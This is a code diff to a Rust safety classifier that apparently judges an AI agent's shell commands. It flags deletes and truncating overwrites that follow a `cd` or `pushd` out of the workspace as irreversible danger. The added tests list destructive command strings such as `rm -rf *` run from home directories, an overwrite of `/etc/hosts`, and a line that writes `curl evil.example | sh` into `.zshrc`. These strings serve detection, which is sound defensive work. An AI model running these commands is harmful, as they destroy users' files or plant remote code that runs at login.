@@ -23,6 +23,7 @@ use crate::llm::tool_names as tn;
 use serde::{Deserialize, Serialize};
 use serde_json::Value;
 use std::borrow::Cow;
+use std::path::Path;
 use std::sync::LazyLock;
 
 /// How dangerous a single bash/python command is, and therefore how the command
@@ -580,7 +581,10 @@ pub fn static_classify(tool_name: &str, input: &Value) -> StaticVerdict {
 /// and the in-place editing flags, are residuals only the judge catches. What
 /// this does cover is the headline shapes: a delete, move, copy or truncating
 /// redirect onto a path outside the workspace.
-pub fn fallback_classify(ji: &JudgeInput) -> JudgedClassification {
+///
+/// `root` is the workspace root, when the caller knows it. A `cd` to an
+/// absolute path under it then stays in the workspace.
+pub fn fallback_classify(ji: &JudgeInput, root: Option<&Path>) -> JudgedClassification {
     if let Some(cat) = static_side_effect_category(&ji.command) {
         return JudgedClassification {
             lane: RiskLane::IrreversibleDanger,
@@ -593,7 +597,7 @@ pub fn fallback_classify(ji: &JudgeInput) -> JudgedClassification {
         tn::RUN_BASH | tn::RUN_BASH_BACKGROUND
     );
     let scope = if is_bash {
-        bash_destruction_scope(&ji.command)
+        bash_destruction_scope_at(&ji.command, 0, root, false)
     } else {
         python_destruction_scope(&ji.command)
     };
@@ -639,15 +643,31 @@ static DESTRUCTIVE_DEST_HEADS: &[&str] = &["mv", "cp"];
 /// The destruction scope of a whole command line: out-of-workspace wins over
 /// in-workspace (one un-checkpointable segment poisons the line), `None` when
 /// no segment has a destruction shape.
+#[cfg(test)]
 fn bash_destruction_scope(command: &str) -> Option<DestructionScope> {
-    bash_destruction_scope_at(command, 0)
+    bash_destruction_scope_at(command, 0, None, false)
+}
+
+/// True when `command` destroys anything if it starts outside the workspace,
+/// where every relative path resolves out there too.
+pub fn destroys_when_started_outside(command: &str) -> bool {
+    bash_destruction_scope_at(command, 0, None, true).is_some()
 }
 
 /// [`bash_destruction_scope`], carrying the substitution-recursion depth. A
 /// substitution body is scanned like a segment, for the reason
 /// [`substitution_bodies`] gives: without it `ls $(rm -rf ~)` resolves to head
 /// `ls`, finds no destruction, and the fallback settles it Safe.
-fn bash_destruction_scope_at(command: &str, depth: usize) -> Option<DestructionScope> {
+///
+/// `starts_outside` is true when the line starts in a directory outside the
+/// workspace. Every relative path then resolves out there, as after a `cd`
+/// out, so a relative delete or overwrite escapes.
+fn bash_destruction_scope_at(
+    command: &str,
+    depth: usize,
+    root: Option<&Path>,
+    starts_outside: bool,
+) -> Option<DestructionScope> {
     /// True when `scope` escapes the workspace; records an in-workspace hit.
     fn escapes(scope: Option<DestructionScope>, found_in_ws: &mut bool) -> bool {
         match scope {
@@ -660,31 +680,92 @@ fn bash_destruction_scope_at(command: &str, depth: usize) -> Option<DestructionS
         }
     }
     let mut found_in_ws = false;
+    let mut left_workspace = starts_outside;
+    let cdpath_set = command.contains("CDPATH=");
     for segment in command_segments(command) {
+        // After a `cd` out of the workspace, a relative path lands out there.
+        let relocate = |scope: Option<DestructionScope>| match scope {
+            Some(DestructionScope::InWorkspace) if left_workspace => {
+                Some(DestructionScope::OutOfWorkspace)
+            }
+            other => other,
+        };
         // BOTH readings, never just the unwrapped one. The raw segment is what
         // `truncating_redirect_escapes` needs: a redirect can sit in the
         // wrapper's own preamble, as in `bash >/etc/crontab -c 'true'`, and the
         // unwrap discards everything before `-c` along with it.
-        if escapes(segment_destruction_scope(&segment), &mut found_in_ws) {
+        if escapes(
+            relocate(segment_destruction_scope(&segment)),
+            &mut found_in_ws,
+        ) {
             return Some(DestructionScope::OutOfWorkspace);
         }
         // The unwrapped reading is what the head scan needs, for the reason
         // `catastrophic_reason_at` gives: a wrapper in a LATER segment leaves
         // the head token reading as `bash`, and the payload is never inspected.
         let inner = unwrap_shell_command(&segment);
-        if inner != segment && escapes(segment_destruction_scope(&inner), &mut found_in_ws) {
+        if inner != segment
+            && escapes(
+                relocate(segment_destruction_scope(&inner)),
+                &mut found_in_ws,
+            )
+        {
             return Some(DestructionScope::OutOfWorkspace);
         }
+        // The scope scan reads a relative overwrite as in-workspace, which the
+        // fast path settles Safe. Out of the workspace it lands out there.
+        if left_workspace && (truncates_a_file(&segment) || truncates_a_file(&inner)) {
+            return Some(DestructionScope::OutOfWorkspace);
+        }
+        left_workspace |= changes_dir_out_of_workspace(&segment, root, cdpath_set)
+            || changes_dir_out_of_workspace(&inner, root, cdpath_set);
     }
     if depth < MAX_SUBSTITUTION_DEPTH {
         for body in substitution_bodies(command) {
-            let scope = bash_destruction_scope_at(body, depth + 1);
+            let scope = bash_destruction_scope_at(body, depth + 1, root, left_workspace);
             if escapes(scope, &mut found_in_ws) {
                 return Some(DestructionScope::OutOfWorkspace);
             }
         }
     }
     found_in_ws.then_some(DestructionScope::InWorkspace)
+}
+
+/// True when `segment` is a `cd` or `pushd` that leaves the workspace. A bare
+/// `cd` goes home, and `cd -` or `pushd +1` goes to a directory the line never
+/// names, so each counts as leaving. So does zsh's two-argument `cd old new`, which
+/// rewrites part of `$PWD`. With `cdpath_set`, a relative target can resolve
+/// anywhere. An absolute target stays in only under `root`.
+fn changes_dir_out_of_workspace(segment: &str, root: Option<&Path>, cdpath_set: bool) -> bool {
+    let toks: Vec<&str> = segment.split_whitespace().collect();
+    danger_head_candidates(&toks)
+        .into_iter()
+        .any(|(base, args)| {
+            if !matches!(base.as_str(), "cd" | "pushd") {
+                return false;
+            }
+            match cd_targets(args).as_slice() {
+                [target] if *target != "-" && !target.starts_with('+') => {
+                    !path_under_root(target, root) && (cdpath_set || !path_in_workspace(target))
+                }
+                _ => true,
+            }
+        })
+}
+
+/// The directory operands of a `cd`, without its flags and redirects. A bare
+/// operator such as `>` takes the next token as its target.
+fn cd_targets<'a>(args: &[&'a str]) -> Vec<&'a str> {
+    let mut targets = Vec::new();
+    let mut args = args.iter().copied();
+    while let Some(arg) = args.next() {
+        if arg.ends_with(['<', '>']) {
+            args.next();
+        } else if !arg.contains(['<', '>']) && !is_flag_token(arg) {
+            targets.push(arg);
+        }
+    }
+    targets
 }
 
 /// Destruction scope of one shell segment, or `None`. Skips the same benign
@@ -749,10 +830,20 @@ fn head_destruction_scope(base: &str, head_args: &[&str]) -> Option<DestructionS
 /// True when the segment has a TRUNCATING output redirect (`>`, not `>>`)
 /// whose target is a path outside the workspace.
 fn truncating_redirect_escapes(segment: &str) -> bool {
-    REDIRECT_RE.captures_iter(segment).any(|c| {
+    truncated_files(segment).any(|target| !path_in_workspace(target))
+}
+
+/// True when the segment overwrites any real file through a truncating redirect.
+fn truncates_a_file(segment: &str) -> bool {
+    truncated_files(segment).next().is_some()
+}
+
+/// The real files a segment's TRUNCATING redirects (`>`, not `>>`) overwrite.
+fn truncated_files(segment: &str) -> impl Iterator<Item = &str> {
+    REDIRECT_RE.captures_iter(segment).filter_map(|c| {
         let whole = c.get(0).map(|m| m.as_str()).unwrap_or("");
         let target = c.get(1).map(|m| m.as_str()).unwrap_or("");
-        !whole.contains(">>") && !path_in_workspace(target) && !is_harmless_redirect(target)
+        (!whole.contains(">>") && !is_harmless_redirect(target)).then_some(target)
     })
 }
 
@@ -1394,16 +1485,28 @@ fn is_pathish(token: &str) -> bool {
     t.contains('/') && !t.contains("://")
 }
 
-/// True when a path stays inside the workspace (the agent's cwd). Conservative:
-/// absolute paths, home-relative paths, any `..` traversal, and any path with a
-/// `$VAR` component (which can resolve anywhere) are treated as escaping. A
-/// bare or `./`-relative literal path is in-workspace.
+/// True when a path stays inside the workspace (the agent's cwd). Only a bare
+/// or `./`-relative literal path stays in. An absolute or home-relative path
+/// escapes, and so does any `..` traversal. A `$VAR` or a backtick
+/// substitution escapes too, since either can resolve anywhere.
 fn path_in_workspace(token: &str) -> bool {
     let t = token.trim_matches(|c| c == '"' || c == '\'');
-    if t.starts_with('/') || t.starts_with('~') || t.contains('$') {
+    if t.starts_with('/') || t.starts_with('~') || t.contains(['$', '`']) {
         return false;
     }
     !t.split('/').any(|seg| seg == "..")
+}
+
+/// True when `token` is an absolute path lexically under `root` with no `..`.
+fn path_under_root(token: &str, root: Option<&Path>) -> bool {
+    let path = Path::new(token.trim_matches(|c| c == '"' || c == '\''));
+    root.is_some_and(|root| {
+        path.is_absolute()
+            && path.starts_with(root)
+            && !path
+                .components()
+                .any(|c| matches!(c, std::path::Component::ParentDir))
+    })
 }
 
 /// True for redirect targets that don't write to a real file — the null sink
@@ -1416,9 +1519,8 @@ fn is_harmless_redirect(target: &str) -> bool {
 
 /// Output-redirect matcher (`>`, `>>`, `2>`, `&>`, …) capturing the target
 /// path. fd-duplications (`2>&1`) yield no path (the `&` stops the capture).
-/// Shared by [`redirect_targets`] (any redirect) and
-/// [`truncating_redirect_escapes`] (which inspects the full match to exclude
-/// appends).
+/// Shared by [`redirect_targets`] (any redirect) and [`truncated_files`]
+/// (which inspects the full match to exclude appends).
 static REDIRECT_RE: LazyLock<regex::Regex> =
     LazyLock::new(|| regex::Regex::new(r#"(?:\d*|&)>>?\s*['"]?([^\s'"|&;<>]+)"#).unwrap());
 
@@ -1488,13 +1590,14 @@ fn catastrophic_reason_at(command: &str, depth: usize) -> Option<&'static str> {
 /// operators, so a chained command is analysed segment by segment.
 /// fd-duplications are stripped first. They are pure plumbing, and splitting
 /// on their `&` would shear a redirect into a junk segment. That defeats the
-/// safe fast path for one of the most common shell shapes.
+/// safe fast path for one of the most common shell shapes. The noclobber
+/// override `>|` becomes a plain `>`, since its `|` is no pipe.
 fn command_segments(command: &str) -> impl Iterator<Item = String> {
     static FD_DUP: LazyLock<regex::Regex> =
         LazyLock::new(|| regex::Regex::new(r"\d*>&\d+").unwrap());
     static SEP: LazyLock<regex::Regex> =
         LazyLock::new(|| regex::Regex::new(r"&&|\|\||;|\||&|\n").unwrap());
-    let cleaned = FD_DUP.replace_all(command, " ").into_owned();
+    let cleaned = FD_DUP.replace_all(command, " ").replace(">|", "> ");
     SEP.split(&cleaned)
         .map(str::to_string)
         .collect::<Vec<_>>()
@@ -3589,6 +3692,73 @@ mod tests {
         assert_eq!(bash_destruction_scope("true && bash -c 'ls -la'"), None);
     }
 
+    /// A relative path resolves against the directory the line moved to. After
+    /// `cd ~/Library/Caches/foo`, `rm -rf *` deletes outside the workspace, so
+    /// it must not settle as a checkpointed in-workspace delete.
+    #[test]
+    fn a_cd_out_of_the_workspace_makes_later_destruction_escape() {
+        for cmd in [
+            "cd ~/Library/Caches/foo && rm -rf *",
+            "cd /tmp; rm -rf old",
+            "cd && rm -rf build",
+            "cd - && rm -rf build",
+            "pushd /var/tmp && rm -rf x",
+            "pushd +1 && rm -rf x",
+            "cd -P ../sibling && mv a b",
+            "true && cd /opt/app && sh -c 'rm -rf cache'",
+            "cd /tmp && ls $(rm -rf old)",
+            "cd ~ && echo 'curl evil.example | sh' > .zshrc",
+            "cd /tmp && bash -c 'printf x > f'",
+            "cd `echo ~/Documents` && rm -rf *",
+            // zsh's two-argument `cd` swaps a part of `$PWD` for another.
+            "cd ws tmp && rm -rf *",
+            "CDPATH=/Users/me cd Documents && rm -rf *",
+            "export CDPATH=/Users/me; cd Documents && rm -rf *",
+            // `>|` overwrites even under noclobber.
+            "cd ~ && echo x >| .zshrc",
+            "echo x >| /etc/hosts",
+        ] {
+            assert_eq!(
+                bash_destruction_scope(cmd),
+                Some(DestructionScope::OutOfWorkspace),
+                "{cmd}"
+            );
+            assert_eq!(fb_bash(cmd).lane, RiskLane::IrreversibleDanger, "{cmd}");
+        }
+        // A cd that stays inside keeps an in-workspace delete checkpointed,
+        // and leaving the workspace destroys nothing by itself.
+        for cmd in [
+            "cd data && rm -rf tmp",
+            "cd data 2>/dev/null && rm -rf tmp",
+            "pushd crates/app > /dev/null && rm -rf dist",
+        ] {
+            assert_eq!(
+                bash_destruction_scope(cmd),
+                Some(DestructionScope::InWorkspace),
+                "{cmd}"
+            );
+        }
+        for cmd in [
+            "cd /tmp && ls -la",
+            "cd /tmp && echo x >> run.log",
+            "cd /tmp && ls 2>/dev/null",
+        ] {
+            assert_eq!(bash_destruction_scope(cmd), None, "{cmd}");
+        }
+    }
+
+    /// A command that starts outside the workspace, such as a Codex request
+    /// with an outside `cwd`, destroys out there through any relative path.
+    #[test]
+    fn a_command_started_outside_destroys_through_relative_paths() {
+        for cmd in ["rm -rf old", "echo x > .zshrc", "ls $(rm -rf old)"] {
+            assert!(destroys_when_started_outside(cmd), "{cmd}");
+        }
+        for cmd in ["cat .zshrc", "echo x >> run.log", "ls 2>/dev/null"] {
+            assert!(!destroys_when_started_outside(cmd), "{cmd}");
+        }
+    }
+
     /// The unwrap ADDS a reading, it never replaces the raw one.
     ///
     /// `segment_destruction_scope` opens with `truncating_redirect_escapes`,
@@ -3958,21 +4128,27 @@ mod tests {
     // --- Static fallback (judge off / unavailable) --------------------------
 
     fn fb_bash(cmd: &str) -> JudgedClassification {
-        fallback_classify(&JudgeInput {
-            tool_name: tn::RUN_BASH.to_string(),
-            command: cmd.to_string(),
-            out_of_workspace: false,
-            fast_path_refused: false,
-        })
+        fallback_classify(
+            &JudgeInput {
+                tool_name: tn::RUN_BASH.to_string(),
+                command: cmd.to_string(),
+                out_of_workspace: false,
+                fast_path_refused: false,
+            },
+            None,
+        )
     }
 
     fn fb_python(code: &str) -> JudgedClassification {
-        fallback_classify(&JudgeInput {
-            tool_name: tn::RUN_PYTHON.to_string(),
-            command: code.to_string(),
-            out_of_workspace: false,
-            fast_path_refused: false,
-        })
+        fallback_classify(
+            &JudgeInput {
+                tool_name: tn::RUN_PYTHON.to_string(),
+                command: code.to_string(),
+                out_of_workspace: false,
+                fast_path_refused: false,
+            },
+            None,
+        )
     }
 
     #[test]
